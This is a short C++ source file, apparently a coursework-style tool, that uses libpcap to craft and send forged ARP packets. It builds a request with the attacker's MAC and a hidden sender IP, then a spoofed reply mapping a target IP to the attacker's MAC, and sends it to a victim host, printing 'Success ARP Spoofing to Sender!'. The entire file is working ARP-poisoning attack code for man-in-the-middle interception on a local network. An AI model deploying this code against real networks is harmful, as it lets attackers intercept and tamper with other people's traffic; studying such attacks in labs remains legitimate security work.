#include <sfdafx.h>
#include <send_arp.h>

void ARP_REQ_ToSender_Set(const char *dev, ARP *Sen_ARP_Pac,uint32_t SenderIP)
{
      unsigned char * Attacker_mac= nullptr;

      // Get_Sender_Mac
        Attacker_mac = find_Attacker_Mac(dev);
        printf("TEST MY_MAC:");
        for(int i=0; i<6; i++)   printf("%02x",Attacker_mac[i]);
        printf("\n");

         memset(Sen_ARP_Pac->Eth_Header.D_Mac,0xff,6);
         Attacker_mac = find_Attacker_Mac(dev);
         memcpy(Sen_ARP_Pac->Eth_Header.S_Mac,Attacker_mac,6);
         Sen_ARP_Pac->Eth_Header.Eth_type=htons(ARP_Number);
         Sen_ARP_Pac->ARP_Header.HW_Type=htons(0x0001);
         Sen_ARP_Pac->ARP_Header.PT_Type=htons(IP_Number);
         Sen_ARP_Pac->ARP_Header.HAL=0X06;
         Sen_ARP_Pac->ARP_Header.PAL=0x04;
         Sen_ARP_Pac->ARP_Header.Oper_Code =htons(OC_Req);//Operate Code = 1,  ARP Request
         for(int i=0; i<6; i++)Sen_ARP_Pac->ARP_Header.SHW_Adr[i] =Sen_ARP_Pac->Eth_Header.S_Mac[i];
         Sen_ARP_Pac->ARP_Header.SPT_Adr= 0x00000000; //hide attacker IP
         memset(Sen_ARP_Pac->ARP_Header.DHW_Adr,0X00,6);
         Sen_ARP_Pac->ARP_Header.DPT_Adr=SenderIP; //Sender IP = 0xC0A82BE1
}

void ARP_REP_ToSender_Set(ARP *Sen_ARP_Pac,const char * argv[] ,const u_char* packet)
{
    for(int i=0; i<6; i++)
         {
            Sen_ARP_Pac->Eth_Header.D_Mac[i] =packet[22+i];
            Sen_ARP_Pac->ARP_Header.DHW_Adr[i]=packet[22+i];
         }
          Sen_ARP_Pac->ARP_Header.SPT_Adr= inet_addr(argv[3]); //target IP 32bit string -> 32bit int
          Sen_ARP_Pac->ARP_Header.DPT_Adr= inet_addr(argv[2]);// Sender IP
           Sen_ARP_Pac->ARP_Header.Oper_Code =htons(OC_Rep);// ARP reply
}

void Send_ARP_ToSender(pcap_t* handle, ARP *Sen_ARP_Pac, int packet_size)
{
           pcap_sendpacket(handle,(unsigned char *)Sen_ARP_Pac,packet_size); //arp_spoofing!!!
           printf("Success ARP Spoofing to Sender!\n");
}
